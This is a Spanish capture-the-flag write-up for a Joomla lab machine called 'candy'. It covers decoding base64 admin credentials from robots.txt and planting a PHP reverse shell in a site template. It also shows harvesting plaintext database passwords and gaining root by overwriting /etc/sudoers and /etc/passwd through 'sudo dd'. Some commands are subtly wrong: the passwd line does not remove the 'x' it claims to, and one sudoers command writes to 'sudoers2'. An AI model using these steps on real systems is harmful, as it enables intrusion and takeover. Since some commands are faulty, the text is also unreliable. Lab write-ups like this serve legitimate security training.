 PORT   STATE SERVICE
80/tcp open  http

-Vamos a la web y encontramos un Joomla

-Escaneamos la web con joomscan
	-joomscan -u http://candy/
	-Información relevante: Joomla versión 4.1.2

-Buscamos exploit pero no parece ser vulnerable

-Nos fijamos en el escaneo profundo y vemos que hay un 'robots.txt' , entramos y nos encontramos lo siguiente:
	admin:c2FubHVpczEyMzQ1

-Analizamos la cadena en 'Cipher Identifier' y nos dice que puede ser base64, probamos:
	-echo 'c2FubHVpczEyMzQ1' | base64 -d
		sanluis12345

-Nos vamos al panel de autenticación /administrator y entramos con las credenciales obtenidas:

-Dentro del dashboard , ganamos acceso a la máquina de la siguiente forma:
	-System --> Site templates --> Cassiopeia --> index.php
	-Insertamos una reverse shell en php y ganamos acceso
	www-data@7791ebdb5b5a:/$


## Escalada de Privilegios

-Vamos a la siguiente ruta:
	-/var/www/html/joomla/configuration.php
	-Hay un usuario y contraseña para conectarse a mysql, sin embargo no hay nada interesante en la BD

-Vamos a /var/backups/hidden 
	-cat otro_caramelo.txt
	$db_user = 'luisillo';
	$db_pass = 'luisillosuperpassword';

-Pivotamos al usuario lusillo

-luisillo@7791ebdb5b5a: sudo -l
	(ALL) NOPASSWD: /bin/dd

-Tenemos permisos de escritura en cualquier archivo del sistema. Varias formas de escalar a root:
	1-Cambiamos el /etc/sudoers para que luisillo pueda ejecutar cualquier tipo de comando como sudo:
		-echo 'luisillo ALL=(ALL:ALL) ALL' | sudo dd of=/etc/sudoers
		-MÁS PRO: Para que pueda ejecutar cualquier comando como sudo sin aportar contraseña:
			-echo 'luisillo ALL=(ALL) NOPASSWD: ALL' | sudo dd of=/etc/sudoers2
	2-Cambiamos el /etc/passwd para quitar la 'x' a root y poder autenticarnos sin contraseña:
		-echo'root:x:0:0:root:/root:/bin/bash' | sudo dd of=/etc/passwd
		(Esta opción no es recomendable en un entorno real ya que solo deja al usuario root, todos los demas usuarios desaparecen)
		
